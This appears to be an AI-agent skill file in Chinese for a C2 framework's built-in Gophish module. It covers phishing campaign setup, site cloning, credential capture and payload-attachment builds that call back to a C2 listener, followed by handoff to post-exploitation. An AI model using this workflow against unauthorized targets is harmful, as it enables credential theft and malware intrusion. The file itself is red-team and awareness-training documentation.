---
name: easyshell-phishing
description: >-
  EasyShell 邮件钓鱼演练（Gophish 内嵌）：SMTP/用户组/模板/落地页/活动/载荷附件。
  链接钓鱼、附件投递、凭据捕获与活动统计。用户做钓鱼演练、安全意识培训或初始访问时使用。
---

# easyshell-phishing: 邮件钓鱼演练标准操作

> **核心逻辑：** 先配基础设施（SMTP + 监听）→ 建用户组 → 写模板/落地页 → 创建活动 → 看结果 → 载荷上线后切 [[easyshell-real]]
>
> **合规前提：** 仅在授权范围内做安全意识培训或红队演练；活动需可追溯、可披露。

---

## 零、模块架构

```
easyshell_web (/Gophish Hub)
  → JWT 加密 REST
  → easyshell_server
       ├─ /gophish-hub/*     EasyShell 自有接口（状态、载荷附件）
       └─ /gophish/api/*     代理到内嵌 Gophish Admin API
  → Gophish 钓鱼服务（独立监听，默认 0.0.0.0:8081）
       └─ 追踪链接 / 落地页 / 打开像素 / 表单提交
```

| 组件 | 职责 |
|------|------|
| 邮件钓鱼服务 | 邮件发送、活动调度、打开/点击/提交统计 |
| TeamServer 集成 | 模块启停、API 代理鉴权、配置同步、审计 |
| Web 控制台 Hub（/Gophish） | 活动、模板、用户组、SMTP、落地页管理 |
| 载荷附件 API | 调用 GenServer 生成 PE/ZIP 附件 |

**与 C2 的关系：** 钓鱼模块负责「投递与追踪」；用户执行附件或访问落地页后，由 EasyShell **监听器**接收回连。两者通过活动模板中的载荷附件或 WebDelivery 联动。

---

## 一、启用与配置

### 1.1 系统设置（Web → 系统管理 → 系统设置）

| 设置项 | 键名 | 说明 |
|--------|------|------|
| 邮件钓鱼模块 | `gophish_enabled` | `true` 后顶栏出现「邮件钓鱼」，模块热启动 |
| 钓鱼服务监听 | `gophish_phish_listen_url` | 格式 `host:port`，如 `0.0.0.0:8081` 或 `phish.example.com:443` |
| 披露联系地址 | `gophish_contact_address` | 透明披露页联系方式 |
| CORS 来源 | `gophish_cors_origins` | 多来源逗号分隔（一般留空） |
| EasyShell 联动 | `gophish_integration_easyshell` | 启用后模板可一键生成载荷附件 |

保存 `gophish_*` 设置后会自动 `InvalidateGophishEnabledCache` 并热重载监听。

### 1.2 检查模块状态

```http
GET /prod-api/api/gophish-hub/status
Authorization2: Bearer <JWT>
```

响应示例：

```json
{
  "status": 200,
  "data": {
    "enabled": true,
    "ready": true,
    "phish_listen": "0.0.0.0:8081"
  }
}
```

`enabled=false` → 去系统设置开启；`ready=false` → 查 TeamServer 日志 `[Gophish]`。

### 1.3 钓鱼 URL 与监听地址

- **活动里的「钓鱼 URL」**：写入 `{{.URL}}` / `{{.BaseURL}}`，须能被目标用户访问（公网域名或内网可达 IP）。
- **钓鱼服务监听**：Gophish 实际接收点击/提交的服务端口，与 TeamServer 主端口（8080）分离。
- 生产环境建议：`gophish_phish_listen_url = phish.example.com:443`，前面挂 Nginx/证书；活动 URL 填 `https://phish.example.com`。

---

## 二、API 速查

### 2.1 EasyShell 自有（Hub）

| 端点 | 方法 | 用途 |
|------|------|------|
| `/gophish-hub/status` | GET | 模块启用/就绪/监听地址 |
| `/gophish-hub/info` | GET | 模块元数据、功能列表 |
| `/gophish-hub/build-attachment` | POST | 生成 PE/ZIP 载荷附件（需操作员席位） |

### 2.2 Gophish 代理（前缀 `/prod-api/api/gophish/api`）

前端 `gophishRequest` 基址：`/prod-api/api/gophish/api`。认证复用 EasyShell JWT；后端注入 `X-EasyShell-Username` + 签名头。

**白名单路径**（`proxy_security.go`，其余 403）：

| 路径 | 用途 |
|------|------|
| `/api/campaigns` | 钓鱼活动 CRUD、结果、summary |
| `/api/groups` | 目标用户组 |
| `/api/templates` | 邮件模板 |
| `/api/pages` | 落地页 |
| `/api/smtp` | 发送配置（Sending Profile） |
| `/api/util/send_test_email` | 测试邮件 |
| `/api/import/group` | 导入用户组 CSV |
| `/api/import/email` | 导入 EML 为模板 |
| `/api/import/site` | 克隆站点为落地页 |

> **注意：** Gophish 原生 API Key 头会被剥离；勿尝试绕过代理直连 Admin 端口。

### 2.3 载荷附件 API

```http
POST /prod-api/api/gophish-hub/build-attachment
Content-Type: application/json（加密载荷）

{
  "payloadType": "stage_pe",
  "listener": "websocket://your-listener:443",
  "architectures": [
    {
      "osType": "windows",
      "archType": "amd64",
      "zipFileName": "update.zip",
      "innerFileName": "setup.exe",
      "zipPassword": "可选"
    }
  ],
  "bundleZipFileName": "多架构总包.zip",
  "legacyUpx": false,
  "sandboxGuard": {},
  "peResources": {}
}
```

`payloadType`：`stageless` | `stage_pe`。多架构时每个 `architectures[]` 可单独指定 `listener`。

返回 Gophish 附件字段：`{ content: base64, type, name }`，可直接写入模板 `attachments`。

---

## 三、标准作业流程（Web Hub）

推荐顺序（顶栏 **邮件钓鱼** → `/Gophish`）：

```
1. 发送配置 (SMTP)     → 验证发信、Envelope Sender
2. 用户组 (Groups)     → CSV 导入或手动录入
3. 邮件模板 (Templates) → 主题/HTML/附件/追踪像素
4. 落地页 (Pages)      → 链接钓鱼时配置；可 import/site 克隆
5. 钓鱼活动 (Campaigns) → 四步向导创建并启动
6. 活动结果            → 打开率/点击率/提交凭据/时间线
```

### 3.1 发送配置（SMTP）

- 配置 SMTP 主机、端口、TLS、用户名密码。
- **Envelope Sender** 决定 SPF/DMARC 对齐，影响进箱率。
- 保存后用「发送测试邮件」验证（`/api/util/send_test_email`）。

### 3.2 用户组

CSV 列：`姓名,邮箱,职位` 或带 `组名` 列批量导入。

```csv
姓名,邮箱,职位
张三,zhangsan@example.com,工程师
```

API：`POST /gophish/api/import/group`（multipart）。

### 3.3 邮件模板

**模板变量（Go template）：**

| 变量 | 含义 |
|------|------|
| `{{.Name}}` | 姓名 |
| `{{.Email}}` | 邮箱 |
| `{{.URL}}` | 带 rid 追踪的落地页链接 |
| `{{.Tracker}}` | 打开追踪 img（勾选「添加追踪像素」时自动插入） |
| `{{.TrackingURL}}` | 追踪像素 URL |
| `{{.Position}}` | 职位 |
| `{{.From}}` | 发件人显示名 |
| `{{.BaseURL}}` | 活动根 URL |
| `{{.RId}}` | 收件人唯一 ID |

**三种演练模式：**

| 模式 | 落地页 | 钓鱼 URL | 典型场景 |
|------|--------|----------|----------|
| 链接钓鱼 | 必选 | 必填 | 仿登录页、OAuth、VPN 门户 |
| 附件钓鱼 | 可空 | 可空 | ZIP/EXE 载荷，模板挂附件 |
| 纯文本 | 可空 | 可空 | 社工话术、无点击追踪 |

**EasyShell 载荷附件：** 模板编辑 →「生成载荷附件」，或 MCP：

```python
easyshell_gophish_status()
easyshell_gophish_build_attachment(
    listener="websocket://c2:443",
    output_path="./phish.zip",
)
```

### 3.4 落地页

- HTML 编辑或 **导入站点**（`/api/import/site`）克隆目标页。
- 开启「捕获提交数据」后，form 提交指向钓鱼服务，凭据写入活动 timeline。
- 预览时注意 `{{.URL}}` 替换行为。

### 3.5 创建活动

四步向导：

1. **基本信息** — 活动名、钓鱼 URL（链接模式必填）
2. **内容与发送** — 模板、落地页（可选）、SMTP
3. **目标** — 一个或多个用户组
4. **调度** — `launchDate` 启动时间；可选 `sendByDate` 分批截止

创建后 API：`POST /gophish/api/campaigns/`。

**编辑排队中活动：** 保存会删原活动并以新配置重建。  
**继续演练：** 沿用配置创建新活动并立即启动。

---

## 四、结果分析与凭据

### 4.1 活动指标

| 指标 | 含义 |
|------|------|
| Email Sent | 已发送 |
| Opened | 打开邮件（追踪像素） |
| Clicked | 点击 `{{.URL}}` |
| Submitted Data | 落地页表单提交 |
| Email Reported | 用户举报模拟钓鱼 |

Dashboard：`GET /gophish/api/campaigns/summary`  
单活动：`GET /gophish/api/campaigns/{id}/results`、`/summary`

### 4.2 捕获凭据

Timeline 中 `message: "Submitted Data"` 的 `details` 为 JSON payload。前端过滤 `rid` / `recipient` 等内部字段，展示 username/password 等。

可导出 CSV：`活动结果_捕获凭据.csv`（Web 活动结果页）。

### 4.3 钓鱼 → 植入体联动

1. 附件模式：载荷附件绑定 **已开启的监听器**（websocket/tcp/http 等）。
2. 活动发出后，在 **客户端列表**（`/Clients`）等待新 uid 上线。
3. 上线后操作切 [[easyshell-real]]：合并命令收集、`set_sleep`、内网扫描等。

```
钓鱼活动发出 → 用户执行附件/点击链接 → EasyShell 监听器收线 → easyshell_list_clients → 后渗透
```

---

## 五、排错与审计

### 5.1 常见问题

| 现象 | 排查 |
|------|------|
| 顶栏无「邮件钓鱼」 | `gophish_enabled` 是否为 `true` |
| API 404 模块未启用 | 同上；重启 TeamServer |
| API 403 禁止访问 | 路径不在白名单；检查是否误调 `/api/users` 等 |
| 邮件发不出 | SMTP 凭据、TLS、发件人域名 SPF |
| 点击链接 404 | 钓鱼 URL 与 `phish_listen` 不一致；防火墙未放行 |
| 附件无回连 | 监听器未开启；载荷架构与目标 OS 不匹配；AV 查杀 |
| 打开率始终 0 | 邮件客户端屏蔽像素；纯文本模式无 Tracker |

### 5.2 审计

Gophish 操作经 `BridgeAudit` 写入 EasyShell `audit_log`，类别前缀 `gophish:` / `[Gophish]`。

---

## 六、操作原则

### ✅ 正确

```
1. 演练前确认授权范围与目标用户组
2. 先 SMTP 测试邮件，再建正式活动
3. 链接钓鱼：钓鱼 URL 与监听地址、DNS、证书一致
4. 附件钓鱼：先在本机测监听器与载荷，再批量发送
5. 活动结束 export 结果，complete 活动归档
6. 拿到凭据后仅用于授权验证，及时 complete 活动
```

### ❌ 错误

```
1. 未开启模块直接调 /gophish/api → 404
2. 活动 URL 填 TeamServer:8080（那是控制台，不是钓鱼服务）
3. 忘记开监听器就发载荷附件
4. 对未授权域名发信
5. 捕获凭据明文外传或提交 git
```

---

## 七、关联 Skills

- [[easyshell-payload]] — GenServer / WebDelivery / shellcode
- [[easyshell-mcp]] — API 与 MCP 工具映射（含 gophish-hub）
- [[easyshell-real]] — 植入体上线后的 C2 操作
- [[easyshell-pentest]] — 全链路：钓鱼初始访问 + 内网
- [[easyshell-package/README]] — MCP 安装与 `--install-skills`
